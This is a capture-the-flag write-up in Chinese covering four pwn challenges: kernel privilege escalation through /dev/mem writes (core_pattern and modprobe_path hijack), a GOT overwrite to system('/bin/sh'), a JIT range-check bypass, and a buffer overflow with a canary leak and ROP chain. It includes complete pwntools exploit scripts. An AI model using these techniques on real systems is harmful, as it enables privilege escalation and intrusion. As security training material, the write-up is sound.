## Pwn

### hwdbg

`start-qemu.sh`:

```shell
#!/bin/sh
exec qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -net nic,model=virtio \
    -net user
```

64MB - 0x4000000，似乎有點少 ?

`hwdbg.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void print_usage(char *progname)
{
  puts("Hardware (I/O port) debugging utility\n");
  printf("Usage: %s mr|mw|ior|iow <size> <offset>\n", progname);
  exit(1);
}
/* only implement this one */
int mem_write(off_t offset, size_t size)
{
  char buf[0x1000];
  int fd = open("/dev/mem", O_RDWR|O_SYNC);
  if (fd == -1) {
    perror("/dev/mem");
    return -1;
  }

  lseek(fd, offset, SEEK_SET);
  for (size_t i = 0; i < size; i += 0x1000) {
    ssize_t nb = read(0, buf, 0x1000);
    if (nb <= 0) break;
    write(fd, buf, i + 0x1000 <= size ? nb : size % 0x1000);
  }

  close(fd);
}

int main(int argc, char **argv)
{
  if (argc < 4)
    print_usage(argv[0]);

  size_t size = strtoll(argv[2], NULL, 16);
  off_t offset = strtoll(argv[3], NULL, 16);

  if (strcmp(argv[1], "mr") == 0) {
    /* not implement */
  } else if (strcmp(argv[1], "mw") == 0) {
    return mem_write(offset, size);
  } else if (strcmp(argv[1], "ior") == 0) {
    /* not implement */
  } else if (strcmp(argv[1], "iow") == 0) {
    /* not implement */
  } else {
    print_usage(argv[0]);
  }
}
```

 `hwdbg` 的權限為 `-r-sr-xr-x    1 root     root         26256 Aug 27 23:39 /bin/hwdbg`，有設 setuid bit，我們的目標就是要透過 `mem_write()` 寫 `/dev/mem` 做到 privilege escalation。不過在此之前仍不了解 `/dev/mem` 的相關知識，參考以下文章了解 `/dev/mem` 的行為與使用方式:

- [jserv - Linux 核心的 `/dev/mem` 裝置](https://hackmd.io/@sysprog/linux-mem-device)
- [解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存](https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw)



---



`/dev/mem` 是**實體記憶體**的映像檔案，實體記憶體指的是實體定址空間，實際上就是 linux 的 live image，除了有 `task_struct`, `sock`, `sk_buff` 等結構，還包含了各種 PCI 設備、IO port，可以用 `sudo cat /proc/iomem` 來看 IO 的 mapping:

```bash
00000000-00000fff : Reserved
00001000-0009fbff : System RAM
0009fc00-0009ffff : Reserved
000a0000-000bffff : PCI Bus 0000:00
000c0000-000c99ff : Video ROM
000ca000-000cadff : Adapter ROM
000cb000-000cb5ff : Adapter ROM
000f0000-000fffff : Reserved
  000f0000-000fffff : System ROM
00100000-03fdffff : System RAM
  02600000-03000c36 : Kernel code
  03200000-033b3fff : Kernel rodata
  03400000-034e137f : Kernel data
  035de000-037fffff : Kernel bss
03fe0000-03ffffff : Reserved
04000000-febfffff : PCI Bus 0000:00
  fd000000-fdffffff : 0000:00:02.0
    fd000000-fdffffff : bochs-drm
  fe000000-fe003fff : 0000:00:03.0
    fe000000-fe003fff : virtio-pci-modern
  feb80000-febbffff : 0000:00:03.0
  febd0000-febd0fff : 0000:00:02.0
    febd0000-febd0fff : bochs-drm
  febd1000-febd1fff : 0000:00:03.0
fec00000-fec003ff : IOAPIC 0
fed00000-fed003ff : HPET 0
  fed00000-fed003ff : PNP0103:00
fee00000-fee00fff : Local APIC
fffc0000-ffffffff : Reserved
100000000-17fffffff : PCI Bus 0000:00
```

這裡除了有一些 IO 的 physical address，也包含 kernel code/rodata/data/bss 的 physical address:

```c
  02600000-03000c36 : Kernel code
  03200000-033b3fff : Kernel rodata
  03400000-034e137f : Kernel data
  035de000-037fffff : Kernel bss
```

當 linux crash 時，可以透過 `kdump` 來搜集 **crash 前**的 memory state 並產生 core dump，而後在透過 `vmcore` 來追蹤原因，而 `/dev/mem` 則是當下的記憶體狀態，並且是直接的 **physical** mapping。

而根據 kernel `Documents/x86/x86_64/mm.txt` 紀錄:

```c
0000000000000000 - 00007fffffffffff (=47 bits) user space, different per mm
hole caused by [48:63] sign extension
ffff800000000000 - ffff87ffffffffff (=43 bits) guard hole, reserved for hypervisor
ffff880000000000 - ffffc7ffffffffff (=64 TB) direct mapping of all phys. memory
ffffc80000000000 - ffffc8ffffffffff (=40 bits) hole
ffffc90000000000 - ffffe8ffffffffff (=45 bits) vmalloc/ioremap space
ffffe90000000000 - ffffe9ffffffffff (=40 bits) hole
ffffea0000000000 - ffffeaffffffffff (=40 bits) virtual memory map (1TB)
... unused hole ...
ffffec0000000000 - fffffc0000000000 (=44 bits) kasan shadow memory (16TB)
... unused hole ...
ffffff0000000000 - ffffff7fffffffff (=39 bits) %esp fixup stacks
... unused hole ...
ffffffef00000000 - ffffffff00000000 (=64 GB) EFI region mapping space
... unused hole ...
ffffffff80000000 - ffffffffa0000000 (=512 MB)  kernel text mapping, from phys 0
ffffffffa0000000 - ffffffffff5fffff (=1526 MB) module mapping space
ffffffffff600000 - ffffffffffdfffff (=8 MB) vsyscalls
ffffffffffe00000 - ffffffffffffffff (=2 MB) unused hole
```

可以知道 `0xffff880000000000` ~ `0xffffc7ffffffffff` 也是 direct physical mapping (不過這題是從 `0xffff888000000000`  開始，可以從 panic 的 message 得知)，因此 `0xffff880000000000` 會對應到 physical  `0`，`0xffff880002600000` 會對到 `0x2600000` 也就是 kernel code，同時也能在 `/proc/iomem` 看到相同的位置，以 `gdb` attach qemu-vm 並查看實際的 memory 以及 direct memory mapping 是否擁有相同資料:

```c
(gdb) x/30gx 0xffffffff81000000 (0xffffffff81000000 (text section start))
0xffffffff81000000:	0x4800e03f51258d48	0xe856fffffff23d8d
0xffffffff81000010:	0x48106a5e000005cc	0x485000000003058d
0xffffffff81000020:	0x8d48000000eae8cb	0xfde856ffffffd33d
(gdb) x/30gx 0xffff888001000000 (0xffff888000000000 + 0x1000000 (iomem kernel code))
0xffff888001000000:	0x4800e03f51258d48	0xe856fffffff23d8d
0xffff888001000010:	0x48106a5e000005cc	0x485000000003058d
0xffff888001000020:	0x8d48000000eae8cb	0xfde856ffffffd33d
```

可以看到與預期結果相同，而又因為 **low memory** (kernel / io device data) 是 contiguous physical mapping，因此每次 map 到的 memory address 是不會變的，也因為這樣 `/proc/iomem` 每次的結果都是一樣，

至此，只需要知道 offset，我們可以任意的更改 kernel code / data / bss 等擁有固定 offset 的 section，然而，雖然 `/dev/mem` 可讀可寫，但是 page permission 的檢測仍然有效，read-only page 仍然不能 write，否則會出現 kernel panic:

```
BUG: unable to handle page fault for address: ffff888001000000
#PF: supervisor write access in kernel mode
#PF: error_code(0x0003) - permissions violation
PGD 2201067 P4D 2201067 PUD 2202067 PMD 80000000010000e1
Oops: 0003 [#1] SMP PTI
...
```

當初在這邊想很久要改什麼，一開始嘗試找 modprobe_path，不過沒有從 `/proc/kallsyms` 找到，賽後用 gdb 找 .data section 有找到:

```c
(gdb) find 0xffffffff81e00000,0xffffffff81ee1380,"/sbin/modprobe"
0xffffffff81e33b60 ( code_base + 0xe33b60 )
```

不過賽中沒有很清楚 `/dev/mem`，所以花了許多時間看這個東西的相關資訊，沒有想到用這種方法搜。而其他解法是更改 `/proc/sys/kernel/core_pattern` 內所記錄的字串 `core` 成 `|/tmp/pwn`，並觸發 core dump，讓 kernel 在  `do_coredump()` 時 parse `core_pattern` 內的字串，執行指定的 executable 來達成 privilege escalation，而 `core` 字串在 kernel 的 offset 如下:

```c
(gdb) find 0xffffffff81e00000,0xffffffff81ee1380,"core"
0xffffffff81eac2a0 ( code_base + 0xeac2a0 )
```

因此藉著 `hwdbg` 更改 kernel code physical base address + (0xeac2a0 or 0xe33b60)，就能分別改到 `core` 以及 `/sbin/modprobe`，達到 core_pattern 或 modprobe_path hjiack，而實際的運作機制不在這邊做詳細介紹，最後的攻擊步驟如下:

- 走 core_pattern hijack
  1. `cat /proc/iomem` 找到 kernel code physical base address 0x2600000 ( `02600000-03000c36 : Kernel code`)
  2. 透過 `hwdbg` 更改 `0x2600000 + 0xeac2a0` 的內容成 `|/tmp/pwn`
  3. `/tmp/pwn` 內寫入如 `chmod 777 /flag` 的內容，並且要設成 executable (`chmod +x /tmp/pwn`)
  4. 透過 `kill -QUIT <pid>` force trigger core dump，`pid` 可以用 `sleep 100 &` 等方式取得
  5. 在 core dump 過程中 `/tmp/pwn` 會被執行
  6. Enjoy your flag !
- 走 modprobe_path
  1. `cat /proc/iomem` 找到 kernel code physical base address 0x2600000 ( `02600000-03000c36 : Kernel code`)
  2. 透過 `hwdbg` 更改 `0x2600000 + 0xe33b60` 的內容成 `/tmp/x`
  3. `/tmp/x` 內寫入如 `chmod 777 /flag` 的內容，並且要設成 executable (`chmod +x /tmp/x`)
  4. 新增檔案 `/tmp/pwn`，並將內容寫成 `\xff\xff\xff\xff`，改成 executable 且執行
  5. 因為 file format 無法辨識，因此會執行 `modprobe_path` 存的 file，也就是我們竄改成 `/tmp/x` 的地方
  6. Enjoy your flag !



kernel debugging 的相關工具:

- kdump + vmcore
- crash
  - `sudo apt-get install crash`
- `systemtap`

qemu 工具:

- qemu monitor
  - 在 start 時加上參數 `-monitor telnet:127.0.0.1:4321,server,nowait`
  - 透過 `nc 0 4321` 連上去
  - `gva2gpa` - guest virtual address to guest physical address，可以直接得到 guest 某塊記憶體的 physical address 為多少
  - `gpa2hva` - guest virtual address to host virtual address，可以找到對應 host process 內的 virtual address 為多少 

其他

- 原生的 `gdb` 可以用 `info proc map` 來看 memory layout



P.S. 當初有想過 `/dev/mem` 為什麼不能修改 code section，不是對 physical 直接做操作嗎 ? 而為什麼 gdb 就可以 ?，後來了解 ptrace 的機制中應該會使用到如 `mprotect()` 這種能夠更改 page permisson 的操作，而直接修改 `/dev/mem` 不會動到 page permission，因此會 trigger panic 也是正常的。



### got_it

```
// file
./chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a1e81221af10a94d8460fbe2a33649824d227777, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/Users/u1f383/v8_env/docker_vol/got_it/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

source:

```c
#include <stdio.h>
#include <unistd.h>

void main() {
  char arg[10] = {0};
  unsigned long address = 0, value = 0;

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("<main> = %p\n", main);
  printf("<printf> = %p\n", printf);

  printf("address: ");
  scanf("%p", (void**)&address);
  printf("value: ");
  scanf("%p", (void**)&value);
  printf("data: ");
  scanf("%9s", (char*)&arg); /* /bin/sh */
  *(unsigned long*)address = value;

  puts(arg);
  _exit(0);
}
```

蓋 `puts` 執行過程中使用到的 function，其在 libc 的 got 就好了。 exploit:

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('pwn.cakectf.com', 9003)
else:
    r = process('./chall')

r.recvuntil(b'<main> =')
code = int(r.recvline()[:-1], 16) - 0x11b9

r.recvuntil(b'<printf> =')
libc = int(r.recvline()[:-1], 16) - 0x64e10

info(f"""
code: {hex(code)}
libc: {hex(libc)}
""")

addr = code + 0x4000
ABS_got_plt = libc + 0x1eb0a8 # writable
_system = libc + 0x55410
input('>')
r.sendlineafter(b'address: ', hex(ABS_got_plt)[2:])
r.sendlineafter(b'value: ', hex(_system)[2:])
r.sendlineafter(b'data: ', "/bin/sh\x00")

r.interactive()
```



### JIT4b

Target: deceive the JIT compiler

題目為一個 JIT compiler，提供了以下操作:

- Add
- Sub
- Mul
- Div
- Min
- Max

而這些操作會改變 JIT check bound 的範圍，如果以下條件成立 (oob):

```cpp
if (isnan(result) || result == 3.14) {
    cout << "[-] That's too ordinal..." << endl;
  } else { // <-- here
    string flag;
    ifstream f("flag.txt");
    getline(f, flag);
    cout << "[+] Wow! You deceived the JIT compiler!" << endl;
    cout << "[+] " << flag << endl;
  }
```

就代表成功繞過 JIT 的 check bound，並且會印出 flag，而一開始的範圍為 `(numeric_limits<int>::min(), numeric_limits<int>::max())`。

當我看到 div operation:

```cpp
  /* Abstract divition */
  Range& operator/=(const int& rhs) {
    if (rhs < 0)
      *this *= -1; // This swaps min and max properly
    // There's no function named "__builtin_sdiv_overflow"
    // (Integer overflow never happens by integer division!)
    min /= abs(rhs);
    max /= abs(rhs);
    return *this;
  }
```

就認為 `abs()` 肯定有問題可以繞，因為 `abs(-2147483648) == -2147483648`，而最後的步驟為:

- min + `-2147483648`
  - 範圍變成 `Range(-2147483648, -2147483648)`
- div + `-2147483648`
  - 會先執行 `*this *= -1`，但是因為有 overflow，因此範圍變成 `Range(-2147483648, 2147483647)` 才除以 `abs(-2147483648)`
  - 範圍變成 `Range(1, 0)`
- mul + `3`
  - 範圍變成 `Range(3, 0)`
- 判斷式為 `0 <= x_spec && x_spec < 3`，會變成 `0 <= 3 && 0 < 3`，因此可以 oob，最終產生的 function 會像是:

```cpp
function f(x) {
  let arr = [3.14, 3.14, 3.14];
  x = Math.min(x, -2147483648);
  x /= -2147483648;
  x *= 3;
  return arr[x];
}
```



### no tiger

```
// file
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce200616b745b19c49c05d5a5f971041e851efaa, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/Users/u1f383/v8_env/docker_vol/tiger/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



`cat` 的型態有許多種，而 cat.name 的存法分別是 char array 以及 char pointer。程式還存在著一個 BOF 的漏洞，可以輸入任何長度的字串，寫入大小只有 20 的 char buffer。

由於 `cat` name pointer 可以被 BOF 蓋到，因此透過改寫 pointer 可以任意 leak，加上又是 NoPIE，因此改寫 pointer 指向 GOT 後，執行 `get_cat()` 可以 leak libc，而後算出 TLS 的 address，再透過同樣的方式得到 canary，最後用 BOF 堆 ROP 即可: 

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('pwn.cakectf.com', 9004)
else:
    r = process('./chall')

Bengal_Cat = 0
Ocicat = 1
Ocelot = 2
Savannah_Cat = 3

# 0x402272 -> new cat
def new_cat(sp, age, name):
    r.sendlineafter(b'>> ', '1')
    r.sendlineafter(b'Species ', str(sp))
    r.sendlineafter(b'Age: ', str(age))
    r.sendlineafter(b'Name: ', name)

# 0x401957
# 0x4019bf
def get_cat():
    r.sendlineafter(b'>> ', '2')

# 0x401f3b -> call rbx (func 0x401ed3)
def set_cat(age, name):
    r.sendlineafter(b'>> ', '3')
    r.sendlineafter(b'Age: ', str(age))
    r.sendlineafter(b'Name: ', name)
    # e.g. getting vtable from 0x407cc0 + index*8

strcpy_got = 0x407fd0

# offset 0x28 - get_cat offset / 0x58 - set_cat offset
set_cat(0xdddddddd, b'\xaa'*0x20 + b'\x00' + b'\xbb'*0xf + b'\xcc'*0x28 + b'\x00')
new_cat(4, 0xdadadada, b"\x66"*0x50 + p64(strcpy_got)) # overwrite ptr
get_cat()
r.recvuntil(b'Name: ')
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x26fc0
canary_addr = libc - 0x16b098
_system = libc + 0x55410
binsh = libc + 0x1b75aa
pop_rdi_ret = libc + 0x26b72
ret = libc + 0x25679
rop = flat(
    pop_rdi_ret,
    binsh,
    ret,
    _system
)
info(f"""
libc: {hex(libc)}
canary_addr: {hex(canary_addr)}
""")
new_cat(4, 0xdadadada, b"\x66"*0x50 + p64(canary_addr + 1)) # overwrite ptr to canary
get_cat()
r.recvuntil(b'Name: ')
canary = b'\x00' + r.recvline()[:-1][:7]
info(f"""
canary: {canary}
""")
input()
new_cat(4, 0xdadadada, b"\xff"*0x88 + canary + b'\xee'*0x18 + rop)
r.sendline('4') # ret: 0x4023d3
r.interactive()
```

